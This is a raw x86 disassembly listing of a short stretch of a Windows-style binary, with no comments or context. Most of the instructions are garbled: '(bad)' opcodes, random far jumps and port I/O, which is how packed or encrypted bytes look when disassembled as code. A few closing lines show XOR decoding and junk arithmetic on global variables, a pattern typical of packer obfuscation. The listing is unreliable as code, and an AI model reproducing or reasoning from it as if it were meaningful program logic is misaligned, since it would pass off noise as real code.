  40415d:	dec    eax
  40415e:	push   edx
  40415f:	scas   eax,DWORD PTR es:[edi]
  404160:	mov    edi,0x62929b07
  404165:	mov    ds:0x1a797f5f,al
  40416a:	lea    ecx,[eax-0x37f52fc8]
  404170:	out    0x63,eax
  404172:	add    al,BYTE PTR [edi*1+0x39bd9abd]
  404179:	push   esi
  40417a:	jns    0x4041b0
  40417c:	fild   QWORD PTR [ecx+0x3f]
  404180:	push   es
  404181:	cwde   
  404182:	and    al,0x60
  404184:	sti    
  404185:	imul   ebx,DWORD PTR [edx-0x33],0x27
  404189:	repnz (bad) 
  40418b:	mov    ds:0x971f6012,eax
  404190:	test   al,0xd6
  404192:	aas    
  404193:	(bad)  
  404194:	jo     0x4041c1
  404196:	add    al,0x3c
  404198:	addr16 mov eax,ds:0xdfc6
  40419c:	enter  0xd7fe,0x45
  4041a0:	lds    ecx,FWORD PTR [ebp-0x38]
  4041a3:	cmp    DWORD PTR [si],esp
  4041a6:	and    edx,0xffffffed
  4041a9:	ja     0x4041d0
  4041ab:	xchg   edx,eax
  4041ac:	add    DWORD PTR [edx-0x3e],0xffffffe9
  4041b0:	pop    eax
  4041b1:	adc    eax,0x2d4bee53
  4041b6:	xchg   BYTE PTR [ebp-0x48],bl
  4041b9:	fnsave ss:[ecx-0x7e05aab3]
  4041c0:	mov    eax,ds:0xde4d3a4f
  4041c5:	pop    ebx
  4041c6:	mov    ch,0xe2
  4041c8:	retf   
  4041c9:	mov    eax,ds:0x7044deb2
  4041ce:	sar    BYTE PTR [ecx+0x3b],1
  4041d1:	movups xmm4,XMMWORD PTR [ebx-0x5d]
  4041d5:	les    esi,FWORD PTR [eax-0x77]
  4041d8:	or     DWORD PTR [ebp+0x26],ebx
  4041db:	jo     0x4041b1
  4041dd:	sbb    esp,DWORD PTR [edx+eiz*1+0xb]
  4041e1:	mov    ch,0x21
  4041e3:	int    0x3c
  4041e5:	push   sp
  4041e7:	xor    BYTE PTR [eax+0x2de0e7fa],bl
  4041ed:	fldcw  WORD PTR [ebx-0x4a]
  4041f0:	adc    ebx,ebx
  4041f2:	ss inc esi
  4041f4:	sbb    eax,0x59068020
  4041f9:	sub    edx,DWORD PTR [ebx+0x38e1d755]
  4041ff:	cmp    ch,BYTE PTR [ebx]
  404201:	inc    eax
  404202:	adc    ch,BYTE PTR ds:0x233306c5
  404208:	popa   
  404209:	scas   eax,DWORD PTR es:[edi]
  40420a:	aad    0x8e
  40420c:	sahf   
  40420d:	cmc    
  40420e:	push   esi
  40420f:	fadd   st(5),st
  404211:	fcomp  DWORD PTR [eax+esi*2+0x5c]
  404215:	push   0xffffff96
  404217:	call   0xade9980f
  40421c:	push   cs
  40421d:	loopne 0x404253
  40421f:	cmc    
  404220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404221:	mov    eax,0x4d2d7ba6
  404226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404227:	rcl    BYTE PTR [eax-0x6e],1
  40422a:	(bad)  
  40422b:	mov    gs,WORD PTR [ebp+0x78]
  40422e:	sub    al,0xbc
  404230:	mov    ebp,0x206dfac2
  404235:	push   eax
  404236:	fsub   QWORD PTR [ecx+0x4a]
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fdee,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	cmpxchg DWORD PTR ds:0x184f7ced,esp
  40425e:	jo     0x4042d0
  404260:	cmp    eax,0x770707d
  404265:	ss jmp 0x61d2:0xa8149c43
  40426d:	push   ebx
  40426e:	cmp    eax,0xdbb99337
  404273:	lds    esi,FWORD PTR [ecx+0x69]
  404276:	sahf   
  404277:	jg     0x404278
  404279:	mov    ss,ebx
  40427b:	rcl    BYTE PTR [edi+eax*1+0x1b],cl
  40427f:	dec    edi
  404280:	add    al,0x7f
  404282:	jns    0x4042bd
  404284:	cli    
  404285:	xchg   edx,eax
  404286:	cli    
  404287:	test   DWORD PTR [edx],ebp
  404289:	loop   0x40422d
  40428b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40428c:	mov    eax,ds:0x280f2790
  404291:	std    
  404292:	out    dx,al
  404293:	inc    edi
  404294:	add    BYTE PTR [edx-0x635d10ca],cl
  40429a:	mov    eax,0x23a91b76
  40429f:	test   al,0x9e
  4042a1:	sti    
  4042a2:	inc    edx
  4042a3:	push   0xffffffb0
  4042a5:	cld    
  4042a6:	push   ecx
  4042a7:	lock imul ecx,DWORD PTR [esi-0x4e],0x678b0094
  4042af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042b0:	mov    edx,0xf3a327ff
  4042b5:	mov    al,0xf0
  4042b7:	mov    dh,0x5f
  4042b9:	jge    0x404332
  4042bb:	jno    0x40427d
  4042bd:	pop    esi
  4042be:	add    BYTE PTR [eax],cl
  4042c0:	jne    0x404279
  4042c2:	sar    BYTE PTR [edx-0x22a4effa],0xb2
  4042c9:	xchg   edi,eax
  4042ca:	scas   al,BYTE PTR es:[edi]
  4042cb:	push   ebp
  4042cc:	or     BYTE PTR [ebx+0x1603dd04],cl
  4042d2:	ja     0x4042da
  4042d4:	rol    BYTE PTR [esi+0x1d9b9d8d],0xff
  4042db:	mov    edx,0x6dd8986e
  4042e0:	dec    ebx
  4042e1:	or     eax,DWORD PTR [ebx-0x4c8ce486]
  4042e7:	(bad)  [ebx+0x348dfd7]
  4042ed:	add    BYTE PTR [ebx],dl
  4042ef:	sbb    BYTE PTR ds:[esi-0x1231737e],ch
  4042f6:	leave  
  4042f7:	test   DWORD PTR [esi+0x41],edx
  4042fa:	mov    edi,0x2bd13d05
  4042ff:	dec    esi
  404300:	fisubr WORD PTR [ebp-0x48276c4a]
  404306:	mov    bh,0x3c
  404308:	sbb    edi,DWORD PTR [ebx+0xe]
  40430b:	sub    al,0xc6
  40430d:	mov    ebx,0xad06f4f7
  404312:	sub    BYTE PTR [edi],ah
  404314:	sbb    al,0xb8
  404316:	fistp  WORD PTR [ebx-0x2c]
  404319:	xchg   edi,ebp
  40431b:	loope  0x4042fa
  40431d:	mov    bh,0x79
  40431f:	lock cdq 
  404321:	cmp    DWORD PTR [ebp-0x59c51f2b],esp
  404327:	xor    eax,0xdbb52e9f
  40432c:	stos   DWORD PTR es:[edi],eax
  40432d:	add    BYTE PTR [ebx+0x6d],dh
  404330:	in     eax,0x81
  404332:	adc    BYTE PTR [esi+0xc707513],ah
  404338:	std    
  404339:	push   esi
  40433a:	or     al,0x8f
  40433c:	and    cl,BYTE PTR [eax-0x2a]
  40433f:	jmp    FWORD PTR [eax+ebp*1]
  404342:	mov    bh,0x3a
  404344:	fs ret 
  404346:	mov    eax,ds:0x6dad8766
  40434b:	adc    esi,DWORD PTR [edx+0x35]
  40434e:	in     al,0x67
  404350:	xor    ch,dl
  404352:	(bad)  
  404354:	rcl    DWORD PTR [ebx-0x28],cl
  404357:	jg     0x4043ae
  404359:	sbb    bl,BYTE PTR [edx+0xd56c597]
  40435f:	out    0xf,eax
  404361:	out    0x8a,eax
  404363:	jp     0x40434d
  404365:	adc    DWORD PTR [ebx-0xdd4e146],ebx
  40436b:	loop   0x4043cb
  40436d:	fidiv  DWORD PTR [ebx-0x55]
  404370:	sub    ecx,esi
  404372:	add    dh,BYTE PTR [edi-0x366d8fc5]
  404378:	sbb    al,0x5d
  40437a:	jmp    0x4043ea
  40437c:	inc    esp
  40437d:	mov    esp,0x2db773c
  404382:	mov    esi,0x26bea882
  404387:	dec    esi
  404388:	mov    dl,0x34
  40438a:	and    BYTE PTR [eax+0x5a4798a3],bh
  404390:	stc    
  404391:	aaa    
  404392:	std    
  404393:	scas   al,BYTE PTR es:[edi]
  404394:	sbb    ebp,DWORD PTR [edi+0x6da71152]
  40439a:	stos   BYTE PTR es:[edi],al
  40439b:	lock sbb DWORD PTR [edx+0x4001826],edi
  4043a2:	push   0x24
  4043a4:	mov    ds:0xa89ced7e,al
  4043a9:	xor    BYTE PTR [esp+ebp*2],0x3a
  4043ad:	out    dx,al
  4043ae:	sbb    BYTE PTR [edx+0x66b7b8e0],dl
  4043b4:	inc    eax
  4043b5:	sbb    BYTE PTR [ecx-0x79],dh
  4043b8:	mov    edx,0xa24bc989
  4043bd:	cs or  eax,0xcd023fd3
  4043c3:	xor    BYTE PTR [edx+ebp*1-0x50d1155d],ah
  4043ca:	retf   0xe96
  4043cd:	retf   0xc5cc
  4043d0:	jne    0x404396
  4043d2:	xchg   ecx,eax
  4043d3:	out    dx,eax
  4043d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043d5:	aas    
  4043d6:	mov    esp,DWORD PTR [eax*2-0x7dc9a030]
  4043dd:	and    ch,BYTE PTR [ebx]
  4043df:	inc    ebx
  4043e0:	retf   0x8d8
  4043e3:	mov    ebp,0x67bcd539
  4043e8:	fcomp  QWORD PTR [esi+0x1c775e74]
  4043ee:	fisttp DWORD PTR [esp+edi*2]
  4043f1:	cs or  al,0x3b
  4043f4:	fld    QWORD PTR [edi+0x68]
  4043f7:	or     BYTE PTR [edi],0x50
  4043fa:	cmp    ebp,DWORD PTR [edx+0x3ce2b47a]
  404400:	ss mov dl,0x86
  404403:	cdq    
  404404:	sub    al,0x58
  404406:	popa   
  404407:	push   edx
  404408:	dec    ebx
  404409:	jmp    0x40447b
  40440b:	xchg   ebx,eax
  40440c:	pop    ecx
  40440d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40440e:	adc    DWORD PTR [edx],edi
  404410:	(bad)  
  404411:	and    BYTE PTR [esi],al
  404413:	and    al,0x4c
  404415:	mov    dh,0x9e
  404417:	sub    BYTE PTR [eax+0x3],dh
  40441a:	cld    
  40441b:	shl    ch,cl
  40441d:	out    dx,al
  40441e:	scas   eax,DWORD PTR es:[edi]
  40441f:	adc    BYTE PTR [edi+0x74513d2d],dl
  404425:	repnz or al,0x14
  404428:	adc    BYTE PTR [ebp-0x8f16392],0xed
  40442f:	adc    eax,0x6ebe6ff7
  404434:	jecxz  0x404482
  404436:	fnstsw WORD PTR [edx-0x56]
  404439:	(bad)  
  40443a:	jo     0x4043c1
  40443c:	mov    bh,0x52
  40443e:	pop    ebx
  40443f:	cmp    al,0x15
  404441:	out    0xb1,eax
  404443:	cmc    
  404444:	ds dec esi
  404446:	fisub  WORD PTR [eax]
  404448:	stc    
  404449:	std    
  40444a:	repz inc ebp
  40444c:	or     DWORD PTR [ebp-0x2b],esi
  40444f:	or     al,0x6e
  404451:	rcr    ebp,cl
  404453:	push   es
  404454:	das    
  404455:	mov    al,0xa6
  404457:	add    eax,0xe2fad639
  40445c:	add    esp,edx
  40445e:	ins    DWORD PTR es:[edi],dx
  40445f:	jmp    0xdecd:0x5e6bf90d
  404466:	sub    ebx,DWORD PTR [eax]
  404468:	mov    al,ds:0x11d7ff29
  40446d:	jne    0x4043fc
  40446f:	inc    esi
  404470:	mov    esp,0x6ee2c764
  404475:	or     al,0x84
  404477:	or     sp,WORD PTR [ecx]
  40447a:	pop    esi
  40447b:	xchg   bh,al
  40447d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40447e:	ficomp DWORD PTR [ebx]
  404480:	adc    ah,dh
  404482:	inc    ebx
  404483:	ins    BYTE PTR es:[edi],dx
  404484:	inc    BYTE PTR [edx+0x29]
  404487:	dec    ebp
  404488:	mov    dh,0x28
  40448a:	cmp    eax,0x17576728
  40448f:	push   ds
  404490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404491:	cmp    al,0x61
  404493:	xor    eax,0x63fd089e
  404498:	mov    cl,0xe
  40449a:	cs push esi
  40449c:	das    
  40449d:	dec    esi
  40449e:	pop    edx
  40449f:	stc    
  4044a0:	punpckldq mm0,DWORD PTR [ebp+0x73]
  4044a4:	mov    ds:0xc113f9f5,al
  4044a9:	mov    DWORD PTR [edx+eiz*4-0x32ef952f],esp
  4044b0:	int3   
  4044b1:	xchg   BYTE PTR es:[eax],cl
  4044b4:	retf   
  4044b5:	shl    DWORD PTR [ebp+0x6704a537],cl
  4044bb:	pop    ds
  4044bc:	push   0xf01bd590
  4044c1:	adc    al,0xc8
  4044c3:	xchg   esi,eax
  4044c4:	mov    esi,0x8119de18
  4044c9:	imul   esp,DWORD PTR [edi+0x78],0x11042853
  4044d0:	ins    BYTE PTR es:[edi],dx
  4044d1:	jmp    0x4044fb
  4044d3:	and    dl,al
  4044d5:	jmp    0xbdc15aae
  4044da:	test   al,0x9f
  4044dc:	(bad)  [ebp+0x3]
  4044df:	push   edi
  4044e0:	test   eax,0xdb1e605d
  4044e5:	sub    ecx,edi
  4044e7:	sub    ch,ah
  4044e9:	mov    eax,ds:0x46bc72bf
  4044ee:	mov    BYTE PTR [edi],ch
  4044f0:	call   0x5698:0xdfcec40e
  4044f7:	jl     0x40456a
  4044f9:	gs push es
  4044fb:	cmp    eax,0xa2cdb0c1
  404500:	sar    BYTE PTR [esi-0x6f],0x96
  404504:	dec    edi
  404505:	fsubr  DWORD PTR [esp+ebx*1]
  404508:	sbb    eax,0x43dafe0b
  40450d:	jns    0x40453e
  40450f:	ret    
  404510:	pop    esi
  404511:	xchg   ebp,eax
  404512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404513:	(bad)  
  404514:	mov    eax,0xc09cb0a2
  404519:	pusha  
  40451a:	xor    al,0xad
  40451c:	out    0x26,eax
  40451e:	shl    BYTE PTR [eax],cl
  404520:	mov    bl,0x1c
  404522:	mov    ds:0x8d6f8f21,eax
  404527:	jno    0x4044d8
  404529:	sub    BYTE PTR [ebx-0x15bdf078],bh
  40452f:	popa   
  404530:	leave  
  404531:	test   ah,ah
  404533:	bound  ebp,QWORD PTR [ecx]
  404535:	mov    ebx,fs
  404537:	push   0x37
  404539:	xor    BYTE PTR [edx-0x2f],dl
  40453c:	xchg   ebp,eax
  40453d:	and    esi,0x8cec1e8d
  404543:	out    dx,eax
  404544:	pushf  
  404545:	jmp    0x4045a2
  404547:	fdivr  st(6),st
  404549:	mov    edx,0x6c1f1ea5
  40454e:	int    0xdc
  404550:	les    ecx,FWORD PTR [esi+edx*4]
  404553:	xor    esp,DWORD PTR [ebx]
  404555:	or     al,0x91
  404557:	pop    esp
  404558:	ret    
  404559:	scas   eax,DWORD PTR es:[edi]
  40455a:	sbb    DWORD PTR [ebp+0x3a],0xffffff86
  40455e:	in     eax,0x4f
  404560:	les    eax,FWORD PTR [edi-0x35]
  404563:	dec    ebp
  404564:	push   ecx
  404565:	or     DWORD PTR [edx+ebx*8-0x78],0x41
  40456a:	pop    esp
  40456b:	lock ror DWORD PTR [edi+0x33],0x70
  404570:	xor    eax,0x5ea1bf90
  404575:	lds    edi,FWORD PTR ds:[eax-0x53eb52e4]
  40457c:	aas    
  40457d:	xchg   esi,eax
  40457e:	xor    al,cl
  404580:	sub    bh,BYTE PTR [ecx+0x7f]
  404583:	sbb    BYTE PTR [bx+si],ah
  404586:	pop    ebx
  404587:	mov    cl,0x79
  404589:	test   al,0xe9
  40458b:	mov    ch,0xf7
  40458d:	jno    0x404545
  40458f:	pop    edx
  404590:	dec    ebp
  404591:	leave  
  404592:	gs rcr ch,0xcc
  404596:	jb     0x40454f
  404598:	xor    al,0xcb
  40459a:	imul   ebx,DWORD PTR [ecx-0x7ce78b6f],0xffffff9d
  4045a1:	fsubr  QWORD PTR [eax-0x4e]
  4045a4:	sub    ah,0x29
  4045a7:	jb     0x403ebe
  4045ad:	and    DWORD PTR ds:0x42fe02,edx
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	enter  0xacde,0x31
  4045cb:	or     al,0x24
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0x2270707d
  4045d4:	test   DWORD PTR ds:0x8ed6135,esp
  4045da:	cmp    bh,BYTE PTR [ebx+0x35]
  4045dd:	jae    0x404574
  4045df:	test   ebx,ebp
  4045e1:	sbb    ch,ch
  4045e3:	je     0x40463b
  4045e5:	mov    ecx,0x528e78f0
  4045ea:	retf   
  4045eb:	push   es
  4045ec:	xlat   BYTE PTR ds:[ebx]
  4045ed:	cdq    
  4045ee:	pop    esp
  4045ef:	cs mov esi,0x51a6bf40
  4045f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045f6:	or     ebp,DWORD PTR ss:[eax+ebx*2]
  4045fa:	or     ebx,DWORD PTR [eax+eiz*4]
  4045fd:	add    eax,0xbc72cd42
  404602:	xchg   ecx,eax
  404603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404604:	jne    0x40467e
  404606:	in     al,0x74
  404608:	dec    eax
  404609:	call   FWORD PTR [edx+0x19]
  40460c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40460d:	(bad)  
  40460e:	xlat   BYTE PTR ds:[ebx]
  40460f:	sahf   
  404610:	int3   
  404611:	jmp    0x5bdc:0xa3285ad2
  404618:	(bad)  
  404619:	ret    
  40461a:	push   cs
  40461b:	lahf   
  40461c:	shr    DWORD PTR [esp+edx*8-0x6a],cl
  404620:	aad    0x9a
  404622:	(bad)  
  404623:	mov    bh,0x6
  404625:	iret   
  404626:	out    0xf7,al
  404628:	add    edi,edi
  40462a:	dec    ebx
  40462b:	push   ebp
  40462c:	sbb    DWORD PTR [eax-0x1e],esp
  40462f:	das    
  404630:	cmp    eax,0x7d697f90
  404635:	test   al,0xbc
  404637:	in     eax,dx
  404638:	lock and eax,0x6865b89d
  40463e:	in     eax,dx
  40463f:	lods   eax,DWORD PTR ds:[esi]
  404640:	pop    es
  404641:	mov    ch,0xdb
  404643:	out    0x16,al
  404645:	das    
  404646:	jo     0x404615
  404648:	add    eax,0xc784c407
  40464d:	sbb    al,0xe0
  40464f:	repnz mov ds:0x372383e,eax
  404655:	and    ebp,DWORD PTR [ebp-0x4984c876]
  40465b:	mov    dh,0xea
  40465d:	lahf   
  40465e:	cdq    
  40465f:	sbb    bh,dl
  404661:	dec    edi
  404662:	les    eax,FWORD PTR [eax-0x58]
  404665:	add    BYTE PTR [eax+0x56],ah
  404668:	ins    BYTE PTR es:[edi],dx
  404669:	push   ebx
  40466a:	xlat   BYTE PTR ds:[ebx]
  40466b:	xchg   BYTE PTR [edx],ah
  40466d:	int    0x44
  40466f:	cmp    eax,DWORD PTR [ebp-0xbd6b24e]
  404675:	push   ecx
  404676:	inc    eax
  404677:	into   
  404678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404679:	test   ebx,eax
  40467b:	inc    edi
  40467c:	iret   
  40467d:	or     ch,ch
  40467f:	mov    edx,0xbe0f2ffe
  404684:	in     al,0xe4
  404686:	adc    al,0x4b
  404688:	jmp    DWORD PTR [ebp+ebx*8+0x321fa911]
  40468f:	inc    esp
  404690:	jmp    FWORD PTR [esi+0x716cc8ea]
  404696:	jae    0x404656
  404698:	xor    BYTE PTR [eax+0x237c7169],ch
  40469e:	dec    esi
  40469f:	jnp    0x404631
  4046a1:	jae    0x4046d6
  4046a3:	test   eax,0x8c987ae2
  4046a8:	mov    eax,0xd5551220
  4046ad:	pop    ecx
  4046ae:	cmp    DWORD PTR [edx+0x47e68516],edi
  4046b4:	addr16 sbb al,0xa6
  4046b7:	daa    
  4046b8:	dec    ebp
  4046b9:	push   ecx
  4046ba:	dec    eax
  4046bb:	in     eax,dx
  4046bc:	and    eax,0xee406946
  4046c1:	cld    
  4046c2:	adc    esi,DWORD PTR [ecx-0x2c1edfa]
  4046c8:	lock mov edx,0xe6cba9d1
  4046ce:	cli    
  4046cf:	pop    edi
  4046d0:	lods   al,BYTE PTR ds:[esi]
  4046d1:	sub    bh,BYTE PTR ds:0x42958f24
  4046d7:	mov    edx,0x8c7331f1
  4046dc:	sub    BYTE PTR [edi+eax*4-0x7c22fd7d],bl
  4046e3:	jne    0x404682
  4046e5:	es lock jmp 0x404715
  4046e9:	mov    ecx,0x5ade29e2
  4046ee:	imul   edi,DWORD PTR [eax],0x3d
  4046f1:	daa    
  4046f2:	addr16 in al,dx
  4046f4:	or     al,0x6d
  4046f6:	(bad)  [edi+0x36]
  4046f9:	mov    al,ds:0x4b6338c5
  4046fe:	mov    dl,ch
  404700:	mov    ebp,0xd5ae5b81
  404705:	mov    ebp,0xe1ce563
  40470a:	and    ah,BYTE PTR ds:[esi]
  40470d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40470e:	in     eax,dx
  40470f:	repz in eax,0xb1
  404712:	jp     0x4046b1
  404714:	pushf  
  404715:	sahf   
  404716:	ss jg  0x404773
  404719:	mov    eax,0xf3d7f3b6
  40471e:	cs int 0xd8
  404721:	jg     0x404740
  404723:	jae    0x404747
  404725:	call   0x2ff3:0x7c730165
  40472c:	(bad)  
  40472f:	mov    ebx,0xa9712199
  404734:	mov    DWORD PTR [eax+0x5788776d],esi
  40473a:	clc    
  40473b:	sbb    ah,BYTE PTR [ebx+ebp*2-0x2bbbb85c]
  404742:	pop    ecx
  404743:	xor    ebx,DWORD PTR [eax+0x3acd3204]
  404749:	add    eax,0xfc1f3efd
  40474e:	adc    eax,0x65a42f5a
  404753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404754:	std    
  404755:	out    0xf7,eax
  404757:	jb     0x404743
  404759:	bound  eax,QWORD PTR [eax]
  40475b:	ret    
  40475c:	call   0xdc8a:0xd50fc5a0
  404763:	lahf   
  404764:	dec    esi
  404765:	shr    eax,0x90
  404768:	ss adc eax,0x5ead8c3d
  40476e:	cdq    
  40476f:	das    
  404770:	ss jle 0x4047d7
  404773:	jge    0x40478e
  404775:	daa    
  404776:	call   DWORD PTR [eax-0xdad5838]
  40477c:	(bad)  
  40477d:	(bad)  [esi+0x136434f6]
  404783:	arpl   di,si
  404785:	ja     0x4047bb
  404787:	xchg   ebx,eax
  404788:	sub    ebx,DWORD PTR [ebx-0x75567010]
  40478e:	out    dx,eax
  40478f:	(bad)  
  404790:	retf   0x99e0
  404793:	mov    bh,0xd0
  404795:	cdq    
  404796:	cdq    
  404797:	or     al,0xa9
  404799:	dec    ebx
  40479a:	inc    BYTE PTR [edi]
  40479c:	push   ebp
  40479d:	repz cmc 
  40479f:	pop    edi
  4047a0:	inc    edi
  4047a1:	sbb    cl,al
  4047a3:	pmaxsw mm2,QWORD PTR [eax+0x2d81ee84]
  4047aa:	addr16 or eax,0x691fbe88
  4047b0:	jbe    0x40479f
  4047b2:	sbb    eax,0x35c3f87f
  4047b7:	inc    ebp
  4047b8:	pop    edi
  4047b9:	adc    eax,0xdc9ceb8e
  4047be:	cmp    eax,edi
  4047c0:	test   BYTE PTR [ebx],bh
  4047c2:	pop    ss
  4047c3:	jmp    0x404772
  4047c5:	out    dx,al
  4047c6:	fsub   QWORD PTR [bx+di]
  4047c9:	out    dx,al
  4047ca:	jle    0x404831
  4047cc:	stos   DWORD PTR es:[edi],eax
  4047cd:	lea    edx,[ebx+0x69053f69]
  4047d3:	jnp    0x40476e
  4047d5:	push   bp
  4047d7:	pushf  
  4047d8:	mov    ebx,0x87648528
  4047dd:	cmp    edx,DWORD PTR [edx+0x5a]
  4047e0:	scas   eax,DWORD PTR es:[edi]
  4047e1:	loope  0x404787
  4047e3:	(bad)
  4047e7:	sub    al,0x3a
  4047e9:	sub    BYTE PTR [eax-0x3c],cl
  4047ec:	push   edi
  4047ed:	jecxz  0x40477b
  4047ef:	dec    eax
  4047f0:	in     eax,0x55
  4047f2:	mov    ds:0xf4cc9aa4,eax
  4047f7:	dec    ebp
  4047f8:	ficom  DWORD PTR [ebx]
  4047fa:	ret    
  4047fb:	loopne 0x4047ef
  4047fd:	pop    ds
  4047fe:	shl    DWORD PTR [eax-0x4507f27f],0x48
  404805:	mov    BYTE PTR [ebx-0x403c510e],al
  40480b:	push   cs
  40480c:	sahf   
  40480d:	mov    ebx,0x3a4d2fbe
  404812:	sub    edx,DWORD PTR [eax+0x790a17fd]
  404818:	nop
  404819:	or     al,ch
  40481b:	jmp    0x404825
  40481d:	add    bl,BYTE PTR [ebx+0xe]
  404820:	mov    dl,0x75
  404822:	les    eax,FWORD PTR [eax+0x14]
  404825:	xchg   BYTE PTR [eax+edx*4+0x33],al
  404829:	dec    ebx
  40482a:	dec    eax
  40482b:	xchg   ebp,eax
  40482c:	ds std 
  40482e:	cdq    
  40482f:	inc    edi
  404830:	int    0x4f
  404832:	jbe    0x4048a7
  404834:	icebp  
  404835:	out    dx,al
  404836:	jno    0x40481e
  404838:	inc    eax
  404839:	jnp    0x404875
  40483b:	xchg   DWORD PTR [eax+0x2bf410c5],ecx
  404841:	sti    
  404842:	push   ss
  404843:	jp     0x4047c8
  404845:	add    ch,dh
  404847:	push   es
  404848:	call   0xa631:0x375a1e6c
  40484f:	in     eax,0xf7
  404851:	out    0x67,al
  404853:	cmp    BYTE PTR [ebx-0x77],ah
  404856:	loopne 0x4048b9
  404858:	pop    edi
  404859:	xchg   DWORD PTR [edx+0x72],eax
  40485c:	mov    esi,0x54f8a666
  404861:	imul   edx,esp,0x54
  404864:	sub    BYTE PTR [esi],dh
  404866:	pop    ss
  404867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404868:	fcmovnb st,st(7)
  40486a:	cwde   
  40486b:	sbb    dh,ah
  40486d:	and    dl,ah
  40486f:	in     al,0xdc
  404871:	mov    cl,0xfd
  404873:	xchg   edi,eax
  404874:	add    dl,BYTE PTR [ebp+0x4d]
  404877:	mov    ds:0xf16c9977,al
  40487c:	push   edi
  40487d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40487f:	and    eax,0x59e90359
  404884:	dec    edx
  404885:	int3   
  404886:	stos   BYTE PTR es:[edi],al
  404887:	cmc    
  404888:	jmp    0x40486b
  40488a:	add    DWORD PTR [ecx],edx
  40488c:	or     BYTE PTR [esi+0x65],dl
  40488f:	dec    ebp
  404890:	sbb    al,0xb8
  404892:	lahf   
  404893:	dec    ebx
  404894:	inc    eax
  404895:	rol    esp,1
  404897:	sbb    al,0x10
  404899:	mov    al,0x54
  40489b:	xchg   ebp,eax
  40489c:	mov    bh,0x27
  40489e:	mov    al,0x7c
  4048a0:	push   ebp
  4048a1:	(bad)  
  4048a2:	mov    edi,0x8e0e3613
  4048a7:	jne    0x4048e3
  4048a9:	ja     0x4048fc
  4048ab:	popf   
  4048ac:	add    edx,edx
  4048ae:	arpl   WORD PTR [ebp-0x34],di
  4048b1:	xor    ebx,DWORD PTR [esi+0x46b1dad6]
  4048b7:	cmp    eax,0xf9e998c4
  4048bc:	js     0x4048c1
  4048be:	fs stc 
  4048c0:	daa    
  4048c1:	icebp  
  4048c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048c3:	call   0x15d5d4fc
  4048c8:	jns    0x404937
  4048ca:	adc    BYTE PTR ds:0x3519cbe3,dl
  4048d0:	faddp  st(4),st
  4048d2:	ja     0x404929
  4048d4:	and    al,0xe0
  4048d6:	(bad)  
  4048d7:	loopne 0x404920
  4048d9:	(bad)  
  4048da:	sub    DWORD PTR [esi-0x41d37acd],esi
  4048e0:	add    eax,0x2fb96a37
  4048e5:	ret    0x1943
  4048e8:	jne    0x404963
  4048ea:	pop    esp
  4048eb:	xor    esp,ebp
  4048ed:	push   cs
  4048ee:	add    eax,0x43be87d0
  4048f3:	ss jbe 0x40496c
  4048f6:	xchg   edx,eax
  4048f7:	stos   BYTE PTR es:[edi],al
  4048f8:	mov    ds:0x3d67d114,eax
  4048fd:	add    al,0x6c
  4048ff:	add    al,0xe3
  404901:	cmp    BYTE PTR [ecx-0x6],al
  404904:	push   ss
  404905:	cmc    
  404906:	nop
  404907:	xor    eax,0x1a9a2507
  40490c:	push   esi
  40490d:	ins    BYTE PTR es:[edi],dx
  40490e:	lea    ecx,[esi+0x6a]
  404911:	arpl   si,sp
  404913:	test   al,0x11
  404915:	lock mov eax,DWORD PTR [ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e19c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e1a4,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e77f,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e1b4,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd85,0x42e1b4
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fdfa,0x42fd79
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fdfe,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e783,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fe02,0x42fdfe
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e787,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
